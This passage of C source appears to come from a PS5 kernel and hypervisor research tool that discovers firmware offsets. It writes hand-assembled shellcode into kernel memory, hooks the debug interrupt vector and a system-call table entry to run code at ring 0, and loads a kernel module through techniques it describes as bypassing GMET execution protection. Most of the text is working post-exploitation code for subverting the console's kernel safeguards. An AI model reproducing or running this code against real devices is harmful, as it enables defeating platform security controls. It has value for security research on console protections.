        EMIT(0x89); EMIT(0x43); EMIT(0x04);

        /* xor eax, eax; restore; ret */
        EMIT(0x31); EMIT(0xC0);
        EMIT(0x41); EMIT(0x5C);  /* pop r12 */
        EMIT(0x5D);              /* pop rbp */
        EMIT(0x5B);              /* pop rbx */
        EMIT(0xC3);              /* ret */

        printf("[*] Launcher: %d bytes\n", lp);
        kernel_copyin(lc, launcher_dmap, lp);

        uint8_t vfy[128];
        kernel_copyout(launcher_dmap, vfy, lp);
        if (memcmp(lc, vfy, lp) != 0) {
            printf("[-] Launcher write failed!\n");
            goto restore;
        }
    }

    /* Clear trace buffer */
    {
        uint8_t zeros[8] = {0};
        kernel_copyin(zeros, trace_buf_dmap, 8);
    }

    /* ── Hook IDT[1] (#DB) ── */
    struct {
        uint16_t offset_lo;
        uint16_t selector;
        uint8_t  ist;
        uint8_t  type_attr;
        uint16_t offset_mid;
        uint32_t offset_hi;
        uint32_t reserved;
    } __attribute__((packed)) orig_idt1, new_idt1;

    uint64_t idt_base = g_kdata_base + KSTUFF_IDT_OFF;
    uint64_t idt1_kva = idt_base + 1 * 16;
    uint64_t idt1_pa  = va_to_pa(idt1_kva);
    if (!idt1_pa) {
        printf("[-] IDT[1] VA->PA failed\n");
        goto restore;
    }

    kernel_copyout(g_dmap_base + idt1_pa, &orig_idt1, 16);
    uint64_t orig_db = (uint64_t)orig_idt1.offset_lo |
                       ((uint64_t)orig_idt1.offset_mid << 16) |
                       ((uint64_t)orig_idt1.offset_hi << 32);
    printf("[*] Original IDT[1]: 0x%016lx (ist=%d)\n",
           (unsigned long)orig_db, orig_idt1.ist);

    memset(&new_idt1, 0, sizeof(new_idt1));
    new_idt1.offset_lo  = (uint16_t)(db_handler_kva & 0xFFFF);
    new_idt1.offset_mid = (uint16_t)((db_handler_kva >> 16) & 0xFFFF);
    new_idt1.offset_hi  = (uint32_t)(db_handler_kva >> 32);
    new_idt1.selector   = orig_idt1.selector;
    new_idt1.ist        = 0;    /* use current kernel stack */
    new_idt1.type_attr  = 0x8E; /* P=1, DPL=0, interrupt gate */

    kernel_copyin(&new_idt1, g_dmap_base + idt1_pa, 16);
    printf("[+] IDT[1] hooked -> 0x%016lx\n", (unsigned long)db_handler_kva);

    /* ── Hook sysent[253] ── */
    uint64_t ent_kva = g_sysent_kva + (uint64_t)TF_TEST_SYSCALL * SYSENT_STRIDE;
    uint64_t ent_pa  = va_to_pa(ent_kva);
    if (!ent_pa) {
        printf("[-] sysent[%d] VA->PA failed! Restoring IDT...\n", TF_TEST_SYSCALL);
        kernel_copyin(&orig_idt1, g_dmap_base + idt1_pa, 16);
        goto restore;
    }

    uint8_t orig_sysent[SYSENT_STRIDE];
    kernel_copyout(g_dmap_base + ent_pa, orig_sysent, SYSENT_STRIDE);

    /* Write launcher_kva to sy_call (offset +8) */
    uint64_t call_pa = va_to_pa(ent_kva + 8);
    kernel_copyin(&launcher_kva, g_dmap_base + call_pa, 8);

    /* Set narg=0 (offset +0) */
    int32_t narg_zero = 0;
    kernel_copyin(&narg_zero, g_dmap_base + ent_pa, 4);

    printf("[+] sysent[%d] hooked -> 0x%016lx\n",
           TF_TEST_SYSCALL, (unsigned long)launcher_kva);

    /* ── Fire! ── */
    printf("[*] Calling syscall(%d)...\n", TF_TEST_SYSCALL);
    fflush(stdout);

    long sc_ret = syscall(TF_TEST_SYSCALL);
    int sc_err = errno;
    printf("[+] syscall returned %ld (errno=%d)\n", sc_ret, sc_err);

    /* ── Restore sysent + IDT immediately ── */
    kernel_copyin(orig_sysent, g_dmap_base + ent_pa, SYSENT_STRIDE);
    kernel_copyin(&orig_idt1, g_dmap_base + idt1_pa, 16);
    printf("[+] sysent[%d] and IDT[1] restored\n", TF_TEST_SYSCALL);

    /* ── Read trace ── */
    uint32_t trace_count = 0, retval = 0;
    kernel_copyout(trace_buf_dmap, &trace_count, 4);
    kernel_copyout(trace_buf_dmap + 4, &retval, 4);

    printf("\n[*] Trace results:\n");
    printf("    Instructions traced: %u (max %d)\n", trace_count, TF_MAX_TRACE);
    printf("    Return value (EAX): %u (0x%x)\n", retval, retval);

    out->count = trace_count;
    out->retval = retval;

    if (trace_count == 0) {
        printf("[-] No trace entries! #DB handler may not have fired.\n");
        goto restore;
    }

    /* Read trace entries */
    int nread = trace_count;
    if (nread > TF_MAX_TRACE) nread = TF_MAX_TRACE;
    kernel_copyout(trace_buf_dmap + 8, out->entries, nread * 16);

    /* Print ktext entries */
    printf("\n    === Instruction Trace ===\n");
    printf("    %4s  %-18s  %-18s  %s\n", "#", "RIP", "RAX", "offset");

    int ktext_count = 0;
    for (int i = 0; i < nread; i++) {
        uint64_t rip = out->entries[i].rip;
        uint64_t rax = out->entries[i].rax;
        int in_ktext = (rip >= g_ktext_base && rip < g_ktext_base + 0x2000000);

        if (in_ktext) {
            printf("    %4d  0x%016lx  0x%016lx  ktext+0x%lx\n",
                   i, (unsigned long)rip, (unsigned long)rax,
                   (unsigned long)(rip - g_ktext_base));
            ktext_count++;
        }
    }
    out->ktext_count = ktext_count;
    printf("\n    ktext entries: %d / %d total\n", ktext_count, nread);

restore:
    /* No kdata to restore — we used a dedicated buffer */
    return (out->count > 0) ? 0 : -1;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Phase 1 Analysis: xapic_mode trace
 * ═══════════════════════════════════════════════════════════════════ */

static void phase1_trace_xapic_mode(void) {
    printf("\n=============================================\n");
    printf("  Phase 1: Trace xapic_mode (TF single-step)\n");
    printf("=============================================\n\n");

    if (!g_apic_ops_addr || g_apic_ops_count < 4) {
        printf("[-] apic_ops not discovered — skipping.\n");
        return;
    }

    /* Get xapic_mode address from apic_ops[2] */
    uint64_t ops_pa = va_to_pa(g_apic_ops_addr);
    if (!ops_pa) {
        printf("[-] apic_ops VA->PA failed\n");
        return;
    }

    uint64_t target;
    kernel_copyout(g_dmap_base + ops_pa + 0x10, &target, 8);  /* slot[2] */
    if (target < g_ktext_base || target >= g_ktext_base + 0x2000000) {
        printf("[-] apic_ops[2] = 0x%lx — not in ktext\n", (unsigned long)target);
        return;
    }

    printf("[*] xapic_mode = apic_ops[2] = 0x%016lx (ktext+0x%lx)\n",
           (unsigned long)target, (unsigned long)(target - g_ktext_base));

    /* Run TF trace */
    struct tf_trace_result trace;
    int ret = tf_trace_function(target, &trace);

    if (ret == 0 && trace.count > 0) {
        printf("\n[+] ============================================\n");
        printf("[+]  XAPIC_MODE TRACED SUCCESSFULLY\n");
        printf("[+] ============================================\n");
        printf("[+]  Return value: %u (0x%x)\n", trace.retval, trace.retval);
        printf("[+]  ktext instructions: %d\n", trace.ktext_count);
        printf("[+]  Total instructions: %u\n", trace.count);

        /* Verify against known offset if on 4.03 */
        if (g_fw_version == 0x4030000) {
            uint64_t expected = g_kdata_base + (int64_t)KSTUFF_DORETI_IRET_OFF;
            printf("[+]\n");
            printf("[+]  Verification (4.03 known offsets):\n");
            printf("[+]    Expected xapic_mode: ktext+0x%lx\n",
                   (unsigned long)(target - g_ktext_base));

            /* Check if any traced instruction matches known offsets */
            for (int i = 0; i < (int)trace.count && i < TF_MAX_TRACE; i++) {
                uint64_t rip = trace.entries[i].rip;
                if (rip == expected) {
                    printf("[+]    FOUND doreti_iret at trace[%d]!\n", i);
                }
            }
        }
    }

    fflush(stdout);
}

/* ─── Main entry point ─── */

int main(void) {
    notify("[Offset Discovery] Starting...");

    FILE *f = fopen("/data/etaHEN/hv_research2.log", "w");
    if (f) {
        fclose(f);
        freopen("/data/etaHEN/hv_research2.log", "w", stdout);
        freopen("/data/etaHEN/hv_research2.log", "a", stderr);
        setvbuf(stdout, NULL, _IOLBF, 0);
        setvbuf(stderr, NULL, _IOLBF, 0);
    }

    printf("\n");
    printf("==============================================\n");
    printf("  PS5 Offset Discovery Tool (hv_research2)\n");
    printf("  Firmware: auto-detect\n");
    printf("==============================================\n\n");
    fflush(stdout);

    /* Core initialization */
    if (init_fw_offsets() != 0) return 1;
    if (discover_dmap_base() != 0) {
        printf("[-] DMAP discovery failed — cannot continue\n");
        return 1;
    }

    /* Discover sysent first — needed for kmod invocation */
    discover_sysent();

    /* ── Load kernel module (MSR recon) ──
     * Try kstuff kekcall first (PS5_kldload approach: kmem_alloc + flat binary).
     * Fall back to kldload + trampoline scan if kstuff unavailable. */
    {
        /* Allocate result buffer (shared between kstuff and kldload paths) */
        off_t kmod_phys = 0;
        void *kmod_vaddr = NULL;
        int kmod_ret = sceKernelAllocateDirectMemory(0, 0x180000000ULL,
            0x4000, 0x4000, SCE_KERNEL_WB_ONION, &kmod_phys);
        if (kmod_ret == 0) {
            kmod_ret = sceKernelMapDirectMemory(&kmod_vaddr, 0x4000,
                SCE_KERNEL_PROT_CPU_RW, 0, kmod_phys, 0x4000);
        }
        if (kmod_ret != 0 || !kmod_vaddr) {
            printf("[-] Failed to allocate kmod result buffer — falling back to kldload\n");
            load_kmod();
        } else {
            memset(kmod_vaddr, 0, 0x4000);

            /* Get DMAP address for the result buffer */
            uint64_t kmod_cpu_pa = va_to_cpu_pa((uint64_t)kmod_vaddr);
            uint64_t kmod_result_kva = 0;
            if (kmod_cpu_pa) {
                kmod_result_kva = g_dmap_base + kmod_cpu_pa;
                printf("[+] Kmod result buffer: VA=0x%lx PA=0x%lx DMAP=0x%lx\n",
                       (unsigned long)kmod_vaddr, (unsigned long)kmod_cpu_pa,
                       (unsigned long)kmod_result_kva);
            }

            int kmod_ok = -1;

            /* Try kstuff kekcall first (direct kmem_alloc RWX + kproc_create).
             * This is the PS5_kldload technique: kstuff intercepts kmem_alloc
             * to mark pages RWX, bypassing GMET enforcement. */
            if (kmod_result_kva) {
                kmod_ok = load_kmod_kstuff(kmod_vaddr, kmod_result_kva);
            }

            /* Try r0gdb approach (PS5_kldload: r0gdb_kmem_alloc + kproc_create) */
            if (kmod_ok != 0 && kmod_result_kva) {
                kmod_ok = load_kmod_r0gdb(kmod_vaddr, kmod_result_kva);
            }

            if (kmod_ok != 0 && kmod_result_kva) {
                /* Try direct sysent approach (write to ktext via DMAP) */
                kmod_ok = load_kmod_direct(kmod_vaddr, kmod_result_kva);
            }

            if (kmod_ok != 0) {
                printf("\n[*] All kmod approaches failed.\n");
                printf("[*] Running gadget scanner and data-based MSR reader...\n");
                scan_ktext_gadgets();
                read_msr_from_kernel_data();
                printf("\n[*] Falling back to kldload...\n");
                load_kmod();
            } else {
                /* Print kstuff results */
                struct kmod_result_buf *results =
                    (struct kmod_result_buf *)kmod_vaddr;
                printf("\n[+] Kmod init completed successfully (kstuff).\n");
                printf("\n[*] MSR/CR values from ring 0:\n");
                for (uint32_t i = 0; i < results->num_msr_results; i++) {
                    if (!results->msr_results[i].valid) continue;
                    uint32_t id = results->msr_results[i].msr_id;
                    uint64_t val = results->msr_results[i].value;
                    const char *name = "unknown";
                    switch (id) {
                        case 0xC0000080: name = "EFER"; break;
                        case 0xC0000081: name = "STAR"; break;
                        case 0xC0000082: name = "LSTAR"; break;
                        case 0xC0000084: name = "SFMASK"; break;
                        case 0xC0000100: name = "FS_BASE"; break;
                        case 0xC0000101: name = "GS_BASE"; break;
                        case 0xC0000102: name = "KGS_BASE"; break;
                        case 0xC0000103: name = "TSC_AUX"; break;
                        case 0xFFFF0000: name = "CR0"; break;
                        case 0xFFFF0003: name = "CR3"; break;
                        case 0xFFFF0004: name = "CR4"; break;
                    }
                    printf("    %-10s (0x%08x) = 0x%016lx\n",
                           name, id, (unsigned long)val);
                    if (id == 0xC0000082) {
                        printf("    → LSTAR is ktext+0x%lx\n",
                               (unsigned long)(val - g_ktext_base));
                    }
                }
            }
        }
    }

    /* Discover apic_ops table */
    discover_apic_ops();

    /* Verify known offsets on 4.03 */
    verify_kstuff_offsets();

    /* Phase 1: TF trace xapic_mode
     *
     * DISABLED: The TF trace writes shellcode to DMAP and tries to execute
     * it.  PS5's hypervisor NPT has NX=1 on DMAP regions, so code execution
     * from DMAP causes a nested page fault → hypervisor panic.
     * Need to relocate shellcode into kmod .text pages (already executable
     * in NPT) before this can work. */
    printf("\n[*] Phase 1 (TF trace) SKIPPED — DMAP exec not safe under HV.\n");
    if (g_sysent_kva && g_apic_ops_addr) {
        printf("    sysent=OK  apic_ops=OK  (ready when shellcode relocation is implemented)\n");
    }

    printf("\n==============================================\n");
    printf("  All phases complete.\n");
    printf("==============================================\n");

    fflush(stdout);
    fflush(stderr);

    notify("[Offset Discovery] Done! Check hv_research2.log");
    return 0;
}
